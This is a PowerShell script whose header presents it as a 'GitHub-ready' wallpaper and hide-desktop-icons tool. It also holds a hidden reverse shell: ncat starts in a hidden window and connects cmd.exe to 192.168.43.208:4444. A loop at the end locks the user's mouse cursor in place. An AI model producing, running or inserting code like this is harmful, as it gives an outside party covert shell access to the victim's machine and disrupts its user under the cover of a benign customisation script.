# --- WALLPAPER + HIDE DESKTOP ICONS (GitHub-ready) ---

# ---------- set local JPG as wallpaper ----------
$imagePath = Join-Path $PSScriptRoot "background.jpg"

Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Wallpaper {
    [DllImport("user32.dll",SetLastError=true)]
    public static extern bool SystemParametersInfo(int uAction,int uParam,string lpvParam,int fuWinIni);
}
"@

# SPI_SETDESKWALLPAPER = 0x0014 ; SPIF_UPDATEINIFILE = 0x01 ; SPIF_SENDWININICHANGE = 0x02
[Wallpaper]::SystemParametersInfo(0x0014, 0, $imagePath, 0x01 -bor 0x02)
# ---------- end ----------

# Hide desktop icons and restart Explorer
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name "HideIcons" -Value 1
Stop-Process -Name explorer -Force
Start-Process explorer.exe 

#Reverse Shell
Set-Location $env:USERPROFILE
$Ncat = "C:\Program Files (x86)\Nmap\ncat.exe"
Start-Process -FilePath $Ncat -ArgumentList "192.168.43.208 4444 -e cmd.exe" -WindowStyle Hidden

<#
mouseblock.ps1
Keeps the mouse locked at its starting position.
Stop with Ctrl+C in this window.
#>

# Import native methods
Add-Type @"
using System;
using System.Runtime.InteropServices;
public static class CursorNative {
    [StructLayout(LayoutKind.Sequential)]
    public struct POINT { public int X; public int Y; }
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
    [DllImport("user32.dll")] public static extern bool GetCursorPos(out POINT lpPoint);
}
"@

# Get starting position
[CursorNative+POINT]$start = New-Object CursorNative+POINT
[CursorNative]::GetCursorPos([ref]$start) | Out-Null
$lockX = $start.X
$lockY = $start.Y

Write-Host "Mouse locked at $lockX,$lockY. Press Ctrl+C to stop."

try {
    while ($true) {
        [CursorNative+POINT]$pt = New-Object CursorNative+POINT
        [CursorNative]::GetCursorPos([ref]$pt) | Out-Null

        if ($pt.X -ne $lockX -or $pt.Y -ne $lockY) {
            [CursorNative]::SetCursorPos($lockX, $lockY) | Out-Null
        }

        Start-Sleep -Milliseconds 10
    }
}
finally {
    Write-Host "`nStopped. Cursor can move freely again."
}


















